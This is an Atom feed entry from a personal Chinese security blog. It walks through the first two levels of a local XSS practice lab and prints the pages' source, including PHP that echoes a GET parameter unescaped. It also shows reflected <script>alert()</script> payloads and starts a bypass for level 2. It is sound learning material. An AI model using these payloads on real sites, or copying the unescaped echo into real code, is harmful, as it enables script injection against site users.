<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kiyomijin.github.io</id>
    <title>My Violet Eva Garden • Posts by &#34;xss跨站脚本攻击探究&#34; category</title>
    <link href="https://kiyomijin.github.io" />
    <updated>2022-10-20T15:36:10.000Z</updated>
    <category term="原创" />
    <category term="SQL注入探究" />
    <category term="XSS跨站脚本攻击探究" />
    <category term="数据库安全" />
    <category term="G计划" />
    <category term="文件上传漏洞探究" />
    <category term="CTF小训" />
    <category term="Misc" />
    <entry>
        <id>https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%BB%95%E8%BF%87/</id>
        <title>XSS小实践与绕过</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
        <content type="html">&lt;h1 id=&#34;xss实践尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss实践尝试&#34;&gt;#&lt;/a&gt; XSS 实践尝试&lt;/h1&gt;
&lt;p&gt;来到 127.0.0.1/xss_vuln&lt;/p&gt;
&lt;h2 id=&#34;xss初体验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss初体验&#34;&gt;#&lt;/a&gt; XSS 初体验&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018203227623.png&#34; alt=&#34;image-20221018203227623&#34;&gt;&lt;/p&gt;
&lt;p&gt;是 get 请求，那么我们看一下参数 test 是否可控&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018203244376.png&#34; alt=&#34;image-20221018203244376&#34;&gt;&lt;/p&gt;
&lt;p&gt;参数可控，那么我们可以写入&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level1.php?name=&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert()&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018203401144.png&#34; alt=&#34;image-20221018203401144&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看前台源码：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--STATUS OK--&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;http-equiv&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;content-type&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;content&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/html;charset=utf-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;alert&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#123;     &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;confirm&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;完成的不错！&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;level2.php?keyword=test&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎来到level1&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;align&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎来到level1&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;align&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎用户JACK&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;level1.png&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h3&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;align&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;payload的长度:4&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h3&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 window.alert 来重写我们的 alert 函数，无论我们在 alert () 中加入什么参数，都会显示 “完成的不错！”&lt;/p&gt;
&lt;p&gt;这里我们目前看不到 get 请求的处理。&lt;/p&gt;
&lt;p&gt;那么继续来看后台代码：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--STATUS OK--&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;http-equiv&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;content-type&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;content&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/html;charset=utf-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;alert&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#123;     &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;confirm&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;完成的不错！&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;level2.php?keyword=test&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎来到level1&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;align&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎来到level1&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;ini_set(&amp;quot;display_errors&amp;quot;, 0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;$str = $_GET[&amp;quot;name&amp;quot;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;echo &amp;quot;&amp;lt;h2 align=center&amp;gt;欢迎用户&amp;quot;.$str.&amp;quot;&amp;lt;/h2&amp;gt;&amp;quot;; &amp;lt;--XSS漏洞点，对于GET的参数没做校验&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;level1.png&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;echo &amp;quot;&amp;lt;h3 align=center&amp;gt;payload的长度:&amp;quot;.strlen($str).&amp;quot;&amp;lt;/h3&amp;gt;&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，由于用户 &lt;code&gt;JACK&lt;/code&gt;  处没有做任何的校验，直接用 &lt;code&gt;.&lt;/code&gt;  来做拼接，那么我们在此处写入 XSS 代码，就会执行脚本语言。&lt;/p&gt;
&lt;h2 id=&#34;xss绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss绕过&#34;&gt;#&lt;/a&gt; XSS 绕过&lt;/h2&gt;
&lt;p&gt;来到第二关&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018204436214.png&#34; alt=&#34;image-20221018204436214&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看前台源码：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--STATUS OK--&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;http-equiv&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;content-type&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;content&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/html;charset=utf-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;alert&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#123;     &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;confirm&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;完成的不错！&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;level3.php?writing=wait&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎来到level2&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;align&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎来到level2&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;align&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;没有找到和JACK相关的结果.&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;level2.php&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;GET&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;keyword&lt;/span&gt;  &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;JACK&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;submit&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;submit&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;搜索&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;level2.png&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h3&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;align&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;payload的长度:4&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h3&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此处和第一关的不同在于使用了 form 表单请求，当点击搜索的时候会发送 GET 请求。&lt;/p&gt;
&lt;p&gt;那么我们尝试输入 XSS&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level2.php?keyword=&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert()&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;amp;submit=JACK&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018204740946.png&#34; alt=&#34;image-20221018204740946&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 &lt;code&gt;尖括号&lt;/code&gt; 被转码，但是在下方 &lt;code&gt;input&lt;/code&gt;  输入标签内，出现了 XSS 标准语句，那么我们需要让 &lt;code&gt;尖括号&amp;lt;&amp;gt;逃逸&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注意： &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;  框需要闭合&lt;/p&gt;
